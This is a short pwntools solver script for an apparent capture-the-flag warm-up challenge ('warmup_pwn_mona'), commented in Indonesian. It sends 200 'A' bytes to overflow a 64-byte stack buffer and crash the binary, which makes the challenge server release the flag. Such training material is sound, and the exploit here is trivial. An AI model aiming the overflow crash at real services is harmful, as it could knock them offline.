#!/usr/bin/env python3
"""
Solver - warmup_pwn_mona
Intended solution: spam 'A' sampai overflow nembus return address,
program crash (SIGSEGV), handler di server nangkep itu dan kirim flag.
Tidak perlu hitung offset presisi / alamat apapun -- warm-up murni.

Usage:
    python solve.py                       # lokal (non-Docker), run ./bin/mona langsung
    python solve.py REMOTE=1 HOST=x PORT=40111
"""
import sys
from pwn import process, remote, context

context.log_level = "info"

args = dict(a.split("=", 1) for a in sys.argv[1:] if "=" in a)
REMOTE = args.get("REMOTE") == "1"
HOST = args.get("HOST", "127.0.0.1")
PORT = int(args.get("PORT", 40111))

if REMOTE:
    io = remote(HOST, PORT)
else:
    io = process("./bin/mona")

io.recvuntil(b"Astrolabe: ")

# buf[64] lokal + saved RBP -> overflow jauh lebih dari itu supaya pasti
# nembus sampai return address dan jump ke alamat 'A'*8 yang gak valid.
payload = b"A" * 200
io.send(payload)

flag = io.recvall(timeout=5)
print(flag.decode(errors="replace").strip())
